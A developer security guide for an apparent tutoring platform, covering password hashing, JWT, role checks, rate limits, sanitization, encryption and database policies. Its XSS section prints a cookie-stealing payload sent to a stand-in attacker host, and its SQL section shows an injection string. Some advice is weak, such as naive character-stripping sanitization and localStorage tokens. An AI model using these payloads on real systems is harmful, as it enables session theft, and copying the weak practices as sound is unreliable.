# 🔒 SECURITY GUIDE

Complete overview of security features in MC Tutor platform.

---

## 🎯 SECURITY OVERVIEW

MC Tutor takes security seriously. Here's how we protect your data:

### ✅ Security Checklist
- [x] Password hashing with bcrypt (10 rounds)
- [x] JWT authentication with refresh tokens
- [x] Role-based access control (RBAC)
- [x] Rate limiting on all endpoints
- [x] Input validation and sanitization
- [x] SQL injection prevention (Supabase ORM)
- [x] XSS protection (Helmet.js)
- [x] File upload validation
- [x] AES-256-GCM message encryption
- [x] Secure session management

---

## 🔐 AUTHENTICATION

### Password Security

**Hashing Algorithm:** bcrypt with 10 salt rounds

When you register:
1. Your password is never stored in plain text
2. We use bcrypt to hash it (one-way encryption)
3. Only the hash is stored in database
4. When you login, we compare hashes - not actual passwords

**Example:**
```
Your Password: "mySecurePass123"
Stored in DB: "$2b$10$EixZaYVK1fsbw1Zfbx3OXe..."
```

**Password Requirements:**
- Minimum 8 characters
- No maximum length
- Can include letters, numbers, symbols

---

### JWT (JSON Web Tokens)

**What is JWT?**
Think of it like a temporary ID card. When you login, you get a token that proves who you are.

**How it works:**
1. You login with email/password
2. Server generates a JWT token
3. Token contains: user ID, role, expiration
4. Every API request includes this token
5. Server verifies token before processing request

**Token Structure:**
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Token Expiration:**
- Access Token: 7 days
- Refresh Token: 30 days

**Token Storage:**
- Stored in browser's localStorage
- Automatically included in API requests
- Cleared on logout

---

### Refresh Tokens

**Why refresh tokens?**
Access tokens expire for security. Refresh tokens let you get a new access token without logging in again.

**Flow:**
1. Access token expires after 7 days
2. Frontend sends refresh token to `/api/auth/refresh`
3. Get new access token
4. Continue using app

---

## 🛡️ AUTHORIZATION (Role-Based Access)

### User Roles

**1. Admin**
- Full system access
- Manage users
- Manage subjects
- View all data
- System statistics

**2. Tutor**
- Manage own profile
- Add/remove subjects
- View session requests
- Upload study materials
- Chat with students
- View received feedback

**3. Tutee (Student)**
- Manage own profile
- Find tutors
- Book sessions
- Download study materials
- Chat with tutors
- Submit feedback

### How RBAC Works

Every API endpoint checks your role:

```typescript
// Example: Only admins can access this
router.get('/admin/users', 
  authMiddleware,           // Check if logged in
  roleMiddleware(['admin']), // Check if admin role
  adminController.getAllUsers
);
```

**If you try to access without permission:**
```json
{
  "success": false,
  "error": {
    "message": "Forbidden: Insufficient permissions"
  }
}
```

---

## 🚧 RATE LIMITING

Rate limiting prevents abuse by limiting requests per time period.

### Rate Limit Tiers

**1. General API (Most endpoints)**
- **Limit:** 100 requests per 15 minutes per IP
- **Example:** Browsing tutors, viewing materials

**2. Authentication Endpoints**
- **Limit:** 5 attempts per 15 minutes per IP
- **Endpoints:** `/api/auth/login`, `/api/auth/register`
- **Why:** Prevent brute force attacks

**3. File Uploads**
- **Limit:** 10 uploads per hour per IP
- **Endpoints:** `/api/materials/upload`, `/api/users/profile/picture`
- **Why:** Prevent storage abuse

**4. Chat Messages**
- **Limit:** 30 messages per minute per IP
- **Endpoint:** `/api/chat/send`
- **Why:** Prevent spam

**When limit exceeded:**
```json
{
  "success": false,
  "error": {
    "message": "Too many requests. Please try again later."
  }
}
```

---

## 🧹 INPUT VALIDATION & SANITIZATION

### Validation

All user input is validated before processing:

**Email Validation:**
```typescript
function isValidEmail(email: string): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}
```

**Student ID Validation:**
```typescript
// Format: YYYY-XXXXX (e.g., 2021-12345)
const studentIdRegex = /^\d{4}-\d{5}$/;
```

**Role Validation:**
```typescript
const validRoles = ['admin', 'tutor', 'tutee'];
```

### Sanitization

Removes dangerous characters from user input:

```typescript
function sanitizeInput(input: string): string {
  return input
    .trim()                    // Remove whitespace
    .replace(/[<>]/g, '')      // Remove < and > (XSS prevention)
    .replace(/'/g, "''");      // Escape single quotes
}
```

**Why this matters:**
Without sanitization, hackers could inject malicious code:
```javascript
// Dangerous input
"<script>alert('hacked')</script>"

// After sanitization
"scriptalert('hacked')/script"
```

---

## 🗄️ SQL INJECTION PREVENTION

**What is SQL Injection?**
A hacking technique where attackers inject SQL code through input fields.

**Example Attack:**
```sql
-- Attacker enters this as email:
admin@test.com' OR '1'='1

-- Creates dangerous SQL:
SELECT * FROM users WHERE email = 'admin@test.com' OR '1'='1'
-- This would return ALL users!
```

**Our Protection:**
We use Supabase's ORM (Object-Relational Mapping) which automatically escapes all input:

```typescript
// Safe - Supabase handles escaping
const { data } = await supabase
  .from('users')
  .select('*')
  .eq('email', userInput);  // Automatically escaped!
```

**Never do this:**
```typescript
// DANGEROUS - Never use raw SQL with user input
const query = `SELECT * FROM users WHERE email = '${userInput}'`;
```

---

## 🛡️ XSS (Cross-Site Scripting) Prevention

**What is XSS?**
Attackers inject malicious JavaScript into web pages.

**Example Attack:**
```html
<!-- Attacker enters as their name: -->
<script>document.location='evil.com/steal?cookie='+document.cookie</script>
```

**Our Protection:**

**1. Helmet.js**
Adds security headers to all responses:
```typescript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"]
    }
  }
}));
```

**2. Input Sanitization**
Removes `<` and `>` characters from all user input.

**3. Output Encoding**
Frontend automatically escapes HTML when displaying user data.

---

## 📁 FILE UPLOAD SECURITY

### Validation Rules

**Profile Pictures:**
- **Allowed types:** JPEG, PNG, GIF
- **Max size:** 2 MB
- **Naming:** UUID + original extension

**Study Materials:**
- **Allowed types:** PDF, DOC, DOCX, PPT, PPTX, ZIP
- **Max size:** 10 MB
- **Naming:** UUID + original extension

### Upload Process

```typescript
// 1. Validate file type
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
if (!allowedTypes.includes(file.mimetype)) {
  throw new Error('Invalid file type');
}

// 2. Validate file size
if (file.size > 2 * 1024 * 1024) { // 2 MB
  throw new Error('File too large');
}

// 3. Generate safe filename
const safeFilename = `${crypto.randomUUID()}.${ext}`;

// 4. Upload to secure storage
await supabase.storage.from('profiles').upload(safeFilename, file);
```

---

## 💬 CHAT ENCRYPTION

### Message Encryption

All chat messages are encrypted using AES-256-GCM.

**How it works:**

**1. Sending a message:**
```
Original: "Hello, when is our session?"
         ↓
Encrypted: "SnV8Yw3D9kP2xM7..."
         ↓
Stored in file: chats/metadata.json
```

**2. Reading a message:**
```
Encrypted: "SnV8Yw3D9kP2xM7..."
         ↓
Decrypted: "Hello, when is our session?"
         ↓
Displayed to user
```

**Encryption Algorithm:**
- **Algorithm:** AES-256-GCM
- **Key:** 32-byte random key (from ENCRYPTION_KEY in .env)
- **IV:** 16-byte random initialization vector (unique per message)

**Why encrypt?**
- Protects message content from database breaches
- Even if someone steals the database, messages are unreadable
- Only users with encryption key can decrypt

---

## 🔑 ENVIRONMENT VARIABLES

### Critical Secrets

These must NEVER be shared or committed to GitHub:

**1. JWT_SECRET**
- Used to sign JWT tokens
- If leaked, attackers can create fake tokens
- Generate: `openssl rand -base64 32`

**2. ENCRYPTION_KEY**
- Used to encrypt chat messages
- If leaked, all messages can be decrypted
- Generate: `node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"`

**3. SUPABASE_ANON_KEY**
- Public key for Supabase access
- Has limited permissions (defined by Row Level Security)
- Safe to use in frontend

**4. SUPABASE_URL**
- Your Supabase project URL
- Public, not a secret

### .env File Protection

```bash
# ✅ GOOD - .env is in .gitignore
server/.env        # Never committed

# ❌ BAD - Don't do this
server/.env.prod   # Contains production secrets
```

**Always check .gitignore:**
```
# .gitignore
server/.env
server/.env.*
*.env
```

---

## 🔒 HTTPS (Production Only)

### Local Development
- Uses HTTP (`http://localhost:3000`)
- Safe because it's only on your computer

### Production (Vercel)
- Automatically uses HTTPS (`https://your-app.vercel.app`)
- All data encrypted in transit
- SSL certificate managed by Vercel

**Why HTTPS matters:**
- Encrypts data between browser and server
- Prevents man-in-the-middle attacks
- Required for modern web apps

---

## 🗃️ DATABASE SECURITY (Supabase)

### Row Level Security (RLS)

**What is RLS?**
Database rules that control who can see/edit what data.

**Example RLS Policies:**

**Users can only see their own profile:**
```sql
CREATE POLICY "Users can view own profile"
ON users FOR SELECT
USING (auth.uid() = user_id);
```

**Students can only book sessions for themselves:**
```sql
CREATE POLICY "Students book for themselves"
ON sessions FOR INSERT
WITH CHECK (auth.uid() = tutee_id);
```

**Admins can see everything:**
```sql
CREATE POLICY "Admins see all"
ON users FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM users 
    WHERE user_id = auth.uid() 
    AND role = 'admin'
  )
);
```

---

## 📊 SECURITY BEST PRACTICES

### For Developers

**1. Never log sensitive data:**
```typescript
// ❌ BAD
console.log('Password:', userPassword);

// ✅ GOOD
console.log('User login attempt:', userEmail);
```

**2. Validate on backend, not just frontend:**
```typescript
// Frontend validation = user experience
// Backend validation = security
```

**3. Use prepared statements (ORM):**
```typescript
// ✅ GOOD - Supabase ORM
.eq('email', userInput)

// ❌ BAD - Raw SQL
`WHERE email = '${userInput}'`
```

**4. Keep dependencies updated:**
```bash
npm audit        # Check for vulnerabilities
npm audit fix    # Fix vulnerabilities
```

### For Users

**1. Use strong passwords:**
- At least 12 characters
- Mix of letters, numbers, symbols
- Don't reuse passwords

**2. Don't share your token:**
- Never send your JWT token to anyone
- Logout from shared computers

**3. Report suspicious activity:**
- Unusual emails
- Unexpected password reset requests
- Weird account activity

---

## 🚨 SECURITY INCIDENT RESPONSE

### If you suspect a breach:

**1. Immediate Actions:**
- Change your password
- Logout from all devices
- Contact admin

**2. For Admins:**
- Rotate JWT_SECRET (invalidates all tokens)
- Rotate ENCRYPTION_KEY (re-encrypt messages)
- Review access logs
- Notify affected users

**3. Update .env file:**
```bash
# Generate new secrets
JWT_SECRET=$(openssl rand -base64 32)
ENCRYPTION_KEY=$(node -e "console.log(require('crypto').randomBytes(32).toString('base64'))")
```

---

## 📚 SECURITY RESOURCES

### Learn More
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Common vulnerabilities
- [JWT.io](https://jwt.io/) - Learn about JWT
- [Bcrypt Explained](https://en.wikipedia.org/wiki/Bcrypt) - Password hashing

### Tools
- [Have I Been Pwned](https://haveibeenpwned.com/) - Check if your email was breached
- [SSL Labs](https://www.ssllabs.com/ssltest/) - Test SSL configuration

---

**Need more help?** Check the [API Reference](03-API-REFERENCE.md) or [Troubleshooting Guide](05-TROUBLESHOOTING.md).
